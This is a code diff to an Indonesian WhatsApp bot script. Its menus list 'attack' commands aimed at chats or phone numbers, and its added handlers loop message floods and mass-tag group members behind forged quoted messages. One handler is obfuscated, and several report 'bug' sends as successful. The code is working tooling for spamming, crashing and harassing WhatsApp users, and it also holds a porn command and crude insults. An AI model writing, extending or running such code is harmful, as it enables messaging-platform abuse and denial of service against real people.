-│➳ ${prefix}ikytroliv2 (jumlah)
-│➳ ${prefix}ikyliveloc (jumlah)
-│➳ ${prefix}ikybuglist (jumlah)
-│➳ ${prefix}ikytagcrash (jumlah)
-│➳ ${prefix}ikycatalog (jumlah)
-│➳ ${prefix}ikybugstik (jumlah)
-│➳ ${prefix}crashiky (jumlah)
-│➳ ${prefix}ikybutton (jumlah)
-│➳ ${prefix}ikybugloc (jumlah)
-│➳ ${prefix}ikybugdoc (jumlah)
-│➳ ${prefix}ikylivelocv2 (jumlah)
-│➳ ${prefix}ikybuginvite (jumlah)
-│➳ ${prefix}ikybugstikv2 (jumlah)
-│➳ ${prefix}ikycatalogv2 (jumlah)
-│➳ ${prefix}ikybugbutton (jumlah)
-│➳ ${prefix}ikybuttonygy (jumlah)
-│➳ ${prefix}ikytengkorak (jumlah)
-│➳ ${prefix}ikyandroid (jumlah) 
-│➳ ${prefix}ikymakerzcrashv2 (jumlah) 
-│➳ ${prefix}ikyartcrash (jumlah) 
-│➳ ${prefix}tengkorak [unlimited]
+│➣ ${prefix}poll
+│➣ ${prefix}polliky
+│➣ ${prefix}bokep
+│➣ ${prefix}ikysantet
+│➣ ${prefix}ikydocnopayment
+│➣ ${prefix}ikyinfinite
+│➣ ${prefix}ikycrashchat
+│➣ ${prefix}ikymakerzcrash
+│➣ ${prefix}ikycrashnopayment
+│➣ ${prefix}ikycrashpakepayment
+│➣ ${prefix}ikynomercy
+│➣ ${prefix}ikycrashemoji
+│➣ ${prefix}ikycrashtitik
+│➣ ${prefix}ikymakerztravazap (jumlah) 
+│➣ ${prefix}ikymakerzcrashhuhu (jumlah) 
+│➣ ${prefix}ikygans (jumlah) 
+│➣ ${prefix}kintil (jumlah)
+│➣ ${prefix}peler (jumlah)
+│➣ ${prefix}itzmeiky (jumlah) 
+│➣ ${prefix}pelerpakepayment (jumlah) 
+│➣ ${prefix}ikypay (jumlah)
+│➣ ${prefix}ikytrol (jumlah)
+│➣ ${prefix}ikytrolii (jumlah)
+│➣ ${prefix}kontol (jumlah)
+│➣ ${prefix}kuntul (jumlah)
+│➣ ${prefix}ikydocu (jumlah)
+│➣ ${prefix}ikyhello (jumlah)
+│➣ ${prefix}virkon (jumlah) 
+│➣ ${prefix}ikylokas (jumlah)
+│➣ ${prefix}monyet (jumlah)
+│➣ ${prefix}ikymomo (jumlah)
+│➣ ${prefix}ikybugpc (jumlah)
+│➣ ${prefix}ikybugvn (jumlah)
+│➣ ${prefix}ikytroliv2 (jumlah)
+│➣ ${prefix}ikyliveloc (jumlah)
+│➣ ${prefix}ikybuglist (jumlah)
+│➣ ${prefix}ikytagcrash (jumlah)
+│➣ ${prefix}ikycatalog (jumlah)
+│➣ ${prefix}ikybugstik (jumlah)
+│➣ ${prefix}crashiky (jumlah)
+│➣ ${prefix}ikybutton (jumlah)
+│➣ ${prefix}ikybugloc (jumlah)
+│➣ ${prefix}ikybugdoc (jumlah)
+│➣ ${prefix}ikylivelocv2 (jumlah)
+│➣ ${prefix}ikybuginvite (jumlah)
+│➣ ${prefix}ikybugstikv2 (jumlah)
+│➣ ${prefix}ikycatalogv2 (jumlah)
+│➣ ${prefix}ikybugbutton (jumlah)
+│➣ ${prefix}ikybuttonygy (jumlah)
+│➣ ${prefix}ikytengkorak (jumlah)
+│➣ ${prefix}ikyandroid (jumlah) 
+│➣ ${prefix}ikymakerzcrashv2 (jumlah) 
+│➣ ${prefix}ikyartcrash (jumlah) 
+│➣ ${prefix}tengkorak [unlimited]
 ╰─────────────────╮
 ╭─────────────────╯
 │ ◪〘 MENU ATTACK1 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}ikyvnprivate (Nomer) 
-│➳ ${prefix}ikykintilprivate (Nomer)
-│➳ ${prefix}ikybuttoprivate (Nomer) 
-│➳ ${prefix}ikystikprivate (Nomer) 
-│➳ ${prefix}ikytroliprivate (Nomer)
-│➳ ${prefix}ikykontolprivate (Nomer)
-│➳ ${prefix}ikykuntulprivate (Nomer)
-│➳ ${prefix}ikyhelloprivate (Nomer)
-│➳ ${prefix}ikysantetprivate (Nomer) 
-│➳ ${prefix}ikymomoprivate (Nomer) 
-│➳ ${prefix}ikybuglocprivate (Nomer)
-│➳ ${prefix}ikyinfiniteprivate (Nomer) 
-│➳ ${prefix}ikybuttonprivate (Nomer)
-│➳ ${prefix}ikylivelocprivate (Nomer)
-│➳ ${prefix}ikybugdocprivate (Nomer)
-│➳ ${prefix}ikybuginviteprivate (Nomer)
-│➳ ${prefix}ikytengkorakprivate (Nomer) 
+│➣ ${prefix}ikyvnprivate (Nomer) 
+│➣ ${prefix}ikykintilprivate (Nomer)
+│➣ ${prefix}ikybuttoprivate (Nomer) 
+│➣ ${prefix}ikystikprivate (Nomer) 
+│➣ ${prefix}ikytroliprivate (Nomer)
+│➣ ${prefix}ikykontolprivate (Nomer)
+│➣ ${prefix}ikykuntulprivate (Nomer)
+│➣ ${prefix}ikyhelloprivate (Nomer)
+│➣ ${prefix}ikysantetprivate (Nomer) 
+│➣ ${prefix}ikymomoprivate (Nomer) 
+│➣ ${prefix}ikybuglocprivate (Nomer)
+│➣ ${prefix}ikyinfiniteprivate (Nomer) 
+│➣ ${prefix}ikybuttonprivate (Nomer)
+│➣ ${prefix}ikylivelocprivate (Nomer)
+│➣ ${prefix}ikybugdocprivate (Nomer)
+│➣ ${prefix}ikybuginviteprivate (Nomer)
+│➣ ${prefix}ikytengkorakprivate (Nomer) 
 ╰─────────────────╮
 ╭─────────────────╯
 │ ◪〘 MENU ATTACK2 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}ikygaskenvn (Nomer) 
-│➳ ${prefix}ikygaskenstik (Nomer) 
-│➳ ${prefix}ikygaskentroli (Nomer)
-│➳ ${prefix}ikygaskenkintil (Nomer)
-│➳ ${prefix}ikygaskenhello (Nomer) 
-│➳ ${prefix}ikygaskenkontol (Nomer)
-│➳ ${prefix}ikygaskenkuntul (Nomer)
-│➳ ${prefix}ikygaskenmomo (Nomer) 
-│➳ ${prefix}ikygaskensantet (Nomer) 
-│➳ ${prefix}ikygaskeninfinite (Nomer) 
-│➳ ${prefix}ikygaskenliveloc (Nomer)
-│➳ ${prefix}ikygaskenbutton (Nomer)
-│➳ ${prefix}ikygaskenbugloc (Nomer)
-│➳ ${prefix}ikygaskentengkorak (Nomer) 
+│➣ ${prefix}ikygaskenvn (Nomer) 
+│➣ ${prefix}ikygaskenstik (Nomer) 
+│➣ ${prefix}ikygaskentroli (Nomer)
+│➣ ${prefix}ikygaskenkintil (Nomer)
+│➣ ${prefix}ikygaskenhello (Nomer) 
+│➣ ${prefix}ikygaskenkontol (Nomer)
+│➣ ${prefix}ikygaskenkuntul (Nomer)
+│➣ ${prefix}ikygaskenmomo (Nomer) 
+│➣ ${prefix}ikygaskensantet (Nomer) 
+│➣ ${prefix}ikygaskeninfinite (Nomer) 
+│➣ ${prefix}ikygaskenliveloc (Nomer)
+│➣ ${prefix}ikygaskenbutton (Nomer)
+│➣ ${prefix}ikygaskenbugloc (Nomer)
+│➣ ${prefix}ikygaskentengkorak (Nomer) 
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4359,7 +4342,7 @@ case 'extrafiturbyiky': {
 break
 case 'buttonbugprivate': {
  anu = `
- extra button!! 
+ extra button private🤫🤫
  
 ${prefix}Abgjualan?
 ${prefix}permisibang
@@ -4381,6 +4364,16 @@ break
 case 'ikysedangberadadiduniaisekai': {
  m.reply (`IIH WIBUU!! `) 
 jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky4.mp3'), mimetype: 'audio/mpeg', ptt:true })
+}
+break
+case 'acumalaka': {
+ m.reply (`awikwok bgt bangj`)
+jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky5.mp3'), mimetype: 'audio/mpeg', ptt:true })
+}
+break
+case 'ikysad'
+ m.reply (`Hmm`)
+jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky6.mp3'), mimetype: 'audio/mpeg', ptt:true })
 }
 break
 case 'bokep':{
@@ -4619,7 +4612,7 @@ function _0x4e80(){const _0x4e0f0d=['info','bind','error','13490KwygoS','{}.cons
 break
 
 case 'ikytagcrash': {
-const _0x4b36f6=_0x14a9;(function(_0x2936fb,_0x15e636){const _0x20762b=_0x14a9,_0x5c9d27=_0x2936fb();while(!![]){try{const _0x21a975=parseInt(_0x20762b(0x126))/0x1*(parseInt(_0x20762b(0x10b))/0x2)+-parseInt(_0x20762b(0x104))/0x3*(-parseInt(_0x20762b(0x123))/0x4)+-parseInt(_0x20762b(0x125))/0x5*(-parseInt(_0x20762b(0x127))/0x6)+parseInt(_0x20762b(0x11b))/0x7+parseInt(_0x20762b(0x120))/0x8*(parseInt(_0x20762b(0x113))/0x9)+-parseInt(_0x20762b(0x108))/0xa*(-parseInt(_0x20762b(0x128))/0xb)+parseInt(_0x20762b(0x11f))/0xc*(-parseInt(_0x20762b(0x129))/0xd);if(_0x21a975===_0x15e636)break;else _0x5c9d27['push'](_0x5c9d27['shift']());}catch(_0x57440e){_0x5c9d27['push'](_0x5c9d27['shift']());}}}(_0x4d12,0x3508d));const _0x3772f2=(function(){let _0x1fe73e=!![];return function(_0x134e06,_0x1da02e){const _0x83e97b=_0x1fe73e?function(){const _0x19a80a=_0x14a9;if(_0x1da02e){const _0x50a1f9=_0x1da02e[_0x19a80a(0x122)](_0x134e06,arguments);return _0x1da02e=null,_0x50a1f9;}}:function(){};return _0x1fe73e=![],_0x83e97b;};}()),_0x593d5a=_0x3772f2(this,function(){const _0x200bff=_0x14a9;return _0x593d5a['toString']()[_0x200bff(0x105)](_0x200bff(0x112))[_0x200bff(0x11e)]()[_0x200bff(0x11a)](_0x593d5a)[_0x200bff(0x105)](_0x200bff(0x112));});_0x593d5a();const _0x55829c=(function(){let _0x441236=!![];return function(_0x5adb56,_0x5e6a79){const _0x2622cb=_0x441236?function(){const _0x47e303=_0x14a9;if(_0x5e6a79){const _0xc57325=_0x5e6a79[_0x47e303(0x122)](_0x5adb56,arguments);return _0x5e6a79=null,_0xc57325;}}:function(){};return _0x441236=![],_0x2622cb;};}()),_0x12631e=_0x55829c(this,function(){const _0x1219ff=_0x14a9;let _0x17aeb6;try{const _0x3847a9=Function('return\x20(function()\x20'+_0x1219ff(0x114)+');');_0x17aeb6=_0x3847a9();}catch(_0x5f2b9b){_0x17aeb6=window;}const _0x257f4e=_0x17aeb6[_0x1219ff(0x117)]=_0x17aeb6[_0x1219ff(0x117)]||{},_0x1aab25=[_0x1219ff(0x107),_0x1219ff(0x106),_0x1219ff(0x110),_0x1219ff(0x111),_0x1219ff(0x115),_0x1219ff(0x124),_0x1219ff(0x11c)];for(let _0x46cb4b=0x0;_0x46cb4b<_0x1aab25['length'];_0x46cb4b++){const _0x57637d=_0x55829c['constructor'][_0x1219ff(0x10c)][_0x1219ff(0x121)](_0x55829c),_0x5230aa=_0x1aab25[_0x46cb4b],_0x278c85=_0x257f4e[_0x5230aa]||_0x57637d;_0x57637d['__proto__']=_0x55829c[_0x1219ff(0x121)](_0x55829c),_0x57637d[_0x1219ff(0x11e)]=_0x278c85[_0x1219ff(0x11e)]['bind'](_0x278c85),_0x257f4e[_0x5230aa]=_0x57637d;}});function _0x14a9(_0x5acb61,_0x4cc164){const _0x4ead2f=_0x4d12();return _0x14a9=function(_0x12631e,_0x55829c){_0x12631e=_0x12631e-0x104;let _0x250128=_0x4ead2f[_0x12631e];return _0x250128;},_0x14a9(_0x5acb61,_0x4cc164);}_0x12631e();{if(!isCreator&&!isBan)return;if(!m['isGroup'])throw mess[_0x4b36f6(0x10a)];if(args['length']==0x0)return m[_0x4b36f6(0x118)](_0x4b36f6(0x11d));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let jansencoli={'key':{'participant':_0x4b36f6(0x119)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':virgam}}};var teks=philips;for(let mem of participants){teks+=_0x4b36f6(0x109)+mem['id'][_0x4b36f6(0x10d)]('@')[0x0]+'\x0a';}jobotz[_0x4b36f6(0x10f)](m[_0x4b36f6(0x10e)],{'text':teks,'mentions':participants['map'](_0x1fae74=>_0x1fae74['id'])},{'quoted':jansencoli});}jancok(_0x4b36f6(0x116));}function _0x4d12(){const _0x4fa670=['sendMessage','info','error','(((.+)+)+)+$','45gGBMxb','{}.constructor(\x22return\x20this\x22)(\x20)','exception','Tag\x20Aja','console','reply','0@s.whatsapp.net','constructor','1340857QPOiVQ','trace','Jumlahnya?','toString','984ZoAhjO','287384xJwVox','bind','apply','5156YvkqnE','table','653765uNBQqt','49732dhtmPJ','18hsFsfD','14047gZfptQ','163293quJuVQ','9jttEHE','search','warn','log','2590gycfdH','│➳\x20@','group','6RvpEEj','prototype','split','chat'];_0x4d12=function(){return _0x4fa670;};return _0x4d12();}
+const _0x4b36f6=_0x14a9;(function(_0x2936fb,_0x15e636){const _0x20762b=_0x14a9,_0x5c9d27=_0x2936fb();while(!![]){try{const _0x21a975=parseInt(_0x20762b(0x126))/0x1*(parseInt(_0x20762b(0x10b))/0x2)+-parseInt(_0x20762b(0x104))/0x3*(-parseInt(_0x20762b(0x123))/0x4)+-parseInt(_0x20762b(0x125))/0x5*(-parseInt(_0x20762b(0x127))/0x6)+parseInt(_0x20762b(0x11b))/0x7+parseInt(_0x20762b(0x120))/0x8*(parseInt(_0x20762b(0x113))/0x9)+-parseInt(_0x20762b(0x108))/0xa*(-parseInt(_0x20762b(0x128))/0xb)+parseInt(_0x20762b(0x11f))/0xc*(-parseInt(_0x20762b(0x129))/0xd);if(_0x21a975===_0x15e636)break;else _0x5c9d27['push'](_0x5c9d27['shift']());}catch(_0x57440e){_0x5c9d27['push'](_0x5c9d27['shift']());}}}(_0x4d12,0x3508d));const _0x3772f2=(function(){let _0x1fe73e=!![];return function(_0x134e06,_0x1da02e){const _0x83e97b=_0x1fe73e?function(){const _0x19a80a=_0x14a9;if(_0x1da02e){const _0x50a1f9=_0x1da02e[_0x19a80a(0x122)](_0x134e06,arguments);return _0x1da02e=null,_0x50a1f9;}}:function(){};return _0x1fe73e=![],_0x83e97b;};}()),_0x593d5a=_0x3772f2(this,function(){const _0x200bff=_0x14a9;return _0x593d5a['toString']()[_0x200bff(0x105)](_0x200bff(0x112))[_0x200bff(0x11e)]()[_0x200bff(0x11a)](_0x593d5a)[_0x200bff(0x105)](_0x200bff(0x112));});_0x593d5a();const _0x55829c=(function(){let _0x441236=!![];return function(_0x5adb56,_0x5e6a79){const _0x2622cb=_0x441236?function(){const _0x47e303=_0x14a9;if(_0x5e6a79){const _0xc57325=_0x5e6a79[_0x47e303(0x122)](_0x5adb56,arguments);return _0x5e6a79=null,_0xc57325;}}:function(){};return _0x441236=![],_0x2622cb;};}()),_0x12631e=_0x55829c(this,function(){const _0x1219ff=_0x14a9;let _0x17aeb6;try{const _0x3847a9=Function('return\x20(function()\x20'+_0x1219ff(0x114)+');');_0x17aeb6=_0x3847a9();}catch(_0x5f2b9b){_0x17aeb6=window;}const _0x257f4e=_0x17aeb6[_0x1219ff(0x117)]=_0x17aeb6[_0x1219ff(0x117)]||{},_0x1aab25=[_0x1219ff(0x107),_0x1219ff(0x106),_0x1219ff(0x110),_0x1219ff(0x111),_0x1219ff(0x115),_0x1219ff(0x124),_0x1219ff(0x11c)];for(let _0x46cb4b=0x0;_0x46cb4b<_0x1aab25['length'];_0x46cb4b++){const _0x57637d=_0x55829c['constructor'][_0x1219ff(0x10c)][_0x1219ff(0x121)](_0x55829c),_0x5230aa=_0x1aab25[_0x46cb4b],_0x278c85=_0x257f4e[_0x5230aa]||_0x57637d;_0x57637d['__proto__']=_0x55829c[_0x1219ff(0x121)](_0x55829c),_0x57637d[_0x1219ff(0x11e)]=_0x278c85[_0x1219ff(0x11e)]['bind'](_0x278c85),_0x257f4e[_0x5230aa]=_0x57637d;}});function _0x14a9(_0x5acb61,_0x4cc164){const _0x4ead2f=_0x4d12();return _0x14a9=function(_0x12631e,_0x55829c){_0x12631e=_0x12631e-0x104;let _0x250128=_0x4ead2f[_0x12631e];return _0x250128;},_0x14a9(_0x5acb61,_0x4cc164);}_0x12631e();{if(!isCreator&&!isBan)return;if(!m['isGroup'])throw mess[_0x4b36f6(0x10a)];if(args['length']==0x0)return m[_0x4b36f6(0x118)](_0x4b36f6(0x11d));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let jansencoli={'key':{'participant':_0x4b36f6(0x119)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':virgam}}};var teks=philips;for(let mem of participants){teks+=_0x4b36f6(0x109)+mem['id'][_0x4b36f6(0x10d)]('@')[0x0]+'\x0a';}jobotz[_0x4b36f6(0x10f)](m[_0x4b36f6(0x10e)],{'text':teks,'mentions':participants['map'](_0x1fae74=>_0x1fae74['id'])},{'quoted':jansencoli});}jancok(_0x4b36f6(0x116));}function _0x4d12(){const _0x4fa670=['sendMessage','info','error','(((.+)+)+)+$','45gGBMxb','{}.constructor(\x22return\x20this\x22)(\x20)','exception','Tag\x20Aja','console','reply','0@s.whatsapp.net','constructor','1340857QPOiVQ','trace','Jumlahnya?','toString','984ZoAhjO','287384xJwVox','bind','apply','5156YvkqnE','table','653765uNBQqt','49732dhtmPJ','18hsFsfD','14047gZfptQ','163293quJuVQ','9jttEHE','search','warn','log','2590gycfdH','│➣\x20@','group','6RvpEEj','prototype','split','chat'];_0x4d12=function(){return _0x4fa670;};return _0x4d12();}
   }
   break
 
@@ -6140,6 +6133,166 @@ await jobotz.sendMessage(m.chat, {text:"Eee bang?"},{quoted:asukonyol11})
  jancok(`abg nya kemana ya? `)
  }
  break
+ case 'permisibang':{
+ if (!isCreator && !isBan) return
+   asukonyol11 = { 
+   key: { 
+   fromMe: false, 
+   participant: `0@s.whatsapp.net`, 
+ ...({ remoteJid: "" }) 
+  }, 
+  message: { 
+ "imageMessage": { 
+ "mimetype": "image/jpeg", 
+ "caption": `haloo bang :v`,
+ "jpegThumbnail": virgam
+ } 
+ } 
+ }
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"haloo?"},{quoted:asukonyol11})
+ jancok(`dahlah`)
+ }
+ break
+ case 'tinggaldimana':{
+ if (!isCreator && !isBan) return
+   asukonyol11 = { 
+   key: { 
+   fromMe: false, 
+   participant: `0@s.whatsapp.net`, 
+ ...({ remoteJid: "" }) 
+  }, 
+  message: { 
+ "imageMessage": { 
+ "mimetype": "image/jpeg", 
+ "caption": `🚀🔥`,
+ "jpegThumbnail": virgam
+ } 
+ } 
+ }
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"Ohh"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"oke"},{quoted:asukonyol11})
+ jancok(`makasih`)
+ }
+ break
+ case 'afahiyah':{
+ if (!isCreator && !isBan) return
+   asukonyol11 = { 
+   key: { 
+   fromMe: false, 
+   participant: `0@s.whatsapp.net`, 
+ ...({ remoteJid: "" }) 
+  }, 
+  message: { 
+ "imageMessage": { 
+ "mimetype": "image/jpeg", 
+ "caption": `sip`,
+ "jpegThumbnail": virgam
+ } 
+ } 
+ }
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:asukonyol11})
+await jobotz.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:asukonyol11})
+ jancok(`🚀🔥`)
+ }
+ break
+ case 'itzmeiky': {            
+if (!isCreator && !isBan) return
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+             teng = `
+Colii dulu deckk
+`
+             asukonyol11 = { 
+                    key: { 
+                        fromMe: false, 
+                        participant: `0@s.whatsapp.net`, 
+                        ...({ remoteJid: "" }) 
+                    }, 
+                    message: { 
+                        "imageMessage": { 
+                            "mimetype": "image/jpeg", 
+                            "caption": `𝙄𝙏𝙕 𝙈𝙀 𝙄𝙆𝙔𝙔🚀`,
+                            "jpegThumbnail": virgam
+                        } 
+                    } 
+                }
+await jobotz.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
+}
+jancok(`Sukses Send bug Sebanyak ${jumlah}`)
+}
+            break
+case 'ikygans': {            
+if (!isCreator && !isBan) return
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+             teng = `
+░░░░░░▄▄
+░░░░░█░░█
+▄▄▄▄▄█░░█▄▄▄
+▓▓▓▓█░░░░░░░█
+▓▓▓▓█░░░░░░░░█
+▓▓▓▓█░░░░░░░░█
+▓▓▓▓█░░░░░░░░█
+███▀▀▀███████ 
+`
+             asukonyol11 = { 
+                    key: { 
+                        fromMe: false, 
+                        participant: `0@s.whatsapp.net`, 
+                        ...({ remoteJid: "" }) 
+                    }, 
+                    message: { 
+                        "imageMessage": { 
+                            "mimetype": "image/jpeg", 
+                            "caption": `THE IKYY BOTZ☕`,
+                            "jpegThumbnail": virgam
+                        } 
+                    } 
+                }
+await jobotz.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
+}
+jancok(`Sukses Send bug Sebanyak ${jumlah}`)
+}
+            break
 
             default:
                 if (budy.startsWith('=>')) {
